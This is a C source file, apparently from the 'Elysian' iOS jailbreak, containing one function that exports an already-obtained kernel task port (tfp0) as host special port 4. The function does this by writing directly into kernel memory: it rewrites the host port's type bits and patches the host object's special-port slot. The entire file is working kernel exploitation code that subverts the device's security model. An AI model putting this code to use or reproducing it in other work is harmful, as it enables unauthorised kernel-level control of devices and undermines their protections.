//
//  sethsp4.c
//  Elysian
//
//  Created by chris  on 4/2/20.
//  Copyright © 2020 chr1s_0x1. All rights reserved.
//
#include "pac/parameters.h"
#include "pac/kernel.h"
#include "pac/kernel_memory.h"
#include "sethsp4.h"
#import "exploit.h"
#import "utils.h"
#import "kernel_memory.h"

int Set_tfp0HSP4(mach_port_t tfp0) {
    // check if we already exported tfp0
    mach_port_t myself = mach_host_self();
    mach_port_t okthen = MACH_PORT_NULL;
    host_get_special_port(myself, HOST_LOCAL_NODE, 4, &okthen);
    mach_port_deallocate(mach_task_self_, myself);
    if(MACH_PORT_VALID(okthen)) {
        LOG("[set hsp4] tfp0 already exported!");
        mach_port_destroy(mach_task_self_, okthen);
        return 0;
    }
    
    // get our host, and host port
    mach_port_t host_self = mach_host_self();
    uint64_t host_port = find_port(host_self);
    uint64_t hsp4 = find_port(tfp0);
    LOG("[set hsp4] hsp4: 0x%llx", hsp4);
    
    // Set hsp4
    wk32(host_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), io_makebits(1, IOT_PORT, IKOT_HOST_PRIV));
    uint64_t realhost = rk64(host_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    _assert(ADDRISVALID(realhost), NULL);
    wk64(realhost + 0x10 + 4 * sizeof(uint64_t), hsp4); // 0x10 = OFFSET(host, special)
    
    // check if we successfully set hsp4
    mach_port_t test = MACH_PORT_NULL;
    host_get_special_port(host_self, HOST_LOCAL_NODE, 4, &test);
    mach_port_deallocate(mach_task_self_, host_self);
    if(!MACH_PORT_VALID(test)) {
        LOG("[set hsp4] ERR: Couldn't set HSP4 port!");
        return 1;
    }
    
    LOG("[set hsp4] Exported tfp0 to HSP4");
    mach_port_destroy(mach_task_self_, test);
    return 0;
}
